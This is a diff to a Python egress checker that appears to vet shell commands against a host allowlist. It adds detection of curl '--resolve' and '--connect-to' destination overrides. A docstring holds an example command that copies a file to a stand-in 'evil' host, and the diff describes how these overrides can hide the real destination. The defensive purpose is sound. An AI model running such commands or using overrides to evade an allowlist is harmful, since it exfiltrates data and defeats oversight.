@@ -159,6 +159,11 @@ _SSH_FLAGS_WITH_ARG = frozenset(
     }
 )
 _URL_SCHEMES = frozenset({"http", "https", "ftp", "sftp", "ssh", "file", "git"})
+# curl --resolve HOST:PORT:ADDR[,ADDR...] and --connect-to HOST1:PORT1:HOST2:PORT2
+# pin the TCP destination independently of the URL hostname.
+_CURL_DEST_OVERRIDE = re.compile(
+    r"(?:^|[\s])(?:--resolve|--connect-to)(?:=|\s+)\+?(\S+)"
+)
 
 
 def _mode() -> str:
@@ -260,6 +265,37 @@ def _host_allowlisted(host: str, allowlist: list[str]) -> bool:
     )
 
 
+def _dest_from_curl_override(spec: str) -> list[str]:
+    """Extract destination host(s)/IP(s) from a curl --resolve/--connect-to spec.
+
+    ``--resolve HOST:PORT:ADDR[,ADDR...]`` and
+    ``--connect-to HOST1:PORT1:HOST2:PORT2`` both put the real destination in
+    the third colon-separated field. IPv6 addresses may be bracketed.
+    """
+    spec = spec.strip("\"'")
+    bracket = re.search(r"\[([^\]]+)\]", spec)
+    if bracket:
+        return [bracket.group(1)]
+    parts = spec.split(":")
+    if len(parts) < 3:
+        return []
+    dest = parts[2]
+    return [d for d in dest.split(",") if d]
+
+
+def _curl_override_hosts(cmd: str) -> tuple[list[str], bool]:
+    """Return (destinations, had_unparsed_override) from curl dest-override flags."""
+    hosts: list[str] = []
+    unparsed = False
+    for match in _CURL_DEST_OVERRIDE.finditer(cmd):
+        dests = _dest_from_curl_override(match.group(1))
+        if dests:
+            hosts.extend(dests)
+        else:
+            unparsed = True
+    return hosts, unparsed
+
+
 def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
     """Return reason string for non-allowlisted egress in *cmd*, else ``None``.
 
@@ -269,6 +305,8 @@ def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
 
     Mixed commands such as ``curl https://allowlisted.example && scp file evil:``
     must not be approved just because the HTTP host is allowlisted.
+    Curl ``--resolve`` / ``--connect-to`` destination overrides are checked
+    independently of the URL hostname.
     """
     if not allowlist:
         return None  # egress check inactive — no allowlist configured
@@ -276,7 +314,10 @@ def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
         return None
     http_hosts = _http_hosts(cmd)
     other_hosts = _non_http_hosts(cmd)
-    hosts = http_hosts + other_hosts
+    override_hosts, unparsed_override = _curl_override_hosts(cmd)
+    if unparsed_override:
+        return "network command with unparsed destination override (allowlist active)"
+    hosts = http_hosts + other_hosts + override_hosts
     if _NON_HTTP_EGRESS.search(cmd) and not other_hosts:
         return "network command with unparsed non-HTTP destination (allowlist active)"
     if not hosts:
